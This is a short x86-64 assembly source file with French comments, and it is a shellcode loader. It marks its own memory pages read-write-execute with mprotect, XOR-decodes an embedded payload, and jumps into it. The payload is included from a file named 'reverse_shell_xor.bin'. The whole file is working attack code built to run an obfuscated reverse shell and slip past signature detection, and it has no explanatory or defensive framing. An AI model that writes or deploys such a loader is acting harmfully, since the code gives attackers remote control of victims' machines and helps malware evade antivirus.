BITS 64
global _start

_start:
    ; mprotect(adresse_page, taille, PROT_READ|PROT_WRITE|PROT_EXEC)
    lea     rdi, [rel _start]     ; adresse du début
    and     rdi, ~0xfff           ; aligner sur la page
    mov     rsi, 0x2000           ; taille = 2 pages
    mov     rdx, 7                ; PROT_READ|PROT_WRITE|PROT_EXEC
    mov     rax, 10               ; syscall mprotect = 10
    syscall

    ; Déchiffrer le shellcode XOR
    lea     rsi, [rel payload]
    mov     rcx, payload_fin - payload

dechiffre:
    xor     byte [rsi], 0x41
    inc     rsi
    loop    dechiffre

    lea     rax, [rel payload]
    jmp     rax

payload:
    incbin "payload/reverse_shell_xor.bin"
payload_fin: